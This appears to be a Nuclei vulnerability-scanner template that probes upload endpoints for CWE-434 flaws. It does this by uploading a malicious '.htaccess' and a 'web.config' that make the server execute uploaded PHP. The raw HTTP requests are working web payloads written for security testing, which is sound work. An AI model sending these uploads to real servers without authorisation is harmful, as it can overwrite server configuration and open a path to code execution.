id: medium-upload-file-overwrite-configuration-files

info:
  name: File Upload - Critical File Overwrite Attack
  author: elite-red-team
  severity: medium
  description: |
    Detects file upload vulnerabilities that allow overwriting critical configuration files.
    This template tests uploading files that can overwrite system or application configuration files.
  reference:
    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-434
  tags: fileupload,file-overwrite,config,critical

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename=".htaccess"
        Content-Type: text/plain
        
        Options +ExecCGI
        AddHandler cgi-script .php
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="file"; filename="web.config"
        Content-Type: text/xml
        
        <?xml version="1.0" encoding="UTF-8"?>
        <configuration>
          <system.webServer>
            <handlers>
              <add name="PHP" path="*.php" verb="*" modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" resourceType="Either" />
            </handlers>
          </system.webServer>
        </configuration>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    payloads:
      path:
        - "{{BaseURL}}/upload"
        - "{{BaseURL}}/upload.php"
        - "{{BaseURL}}/fileupload"
        - "{{BaseURL}}/file/upload"
        - "{{BaseURL}}/admin/upload"
        - "{{BaseURL}}/user/upload"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        words:
          - "upload"
          - "success"
          - "file"
          - "saved"
          - "uploaded"
        condition: or
        case-insensitive: true

      - type: word
        words:
          - "error"
          - "failed"
          - "invalid"
          - "not allowed"
          - "forbidden"
        condition: or
        case-insensitive: true
        negative: true
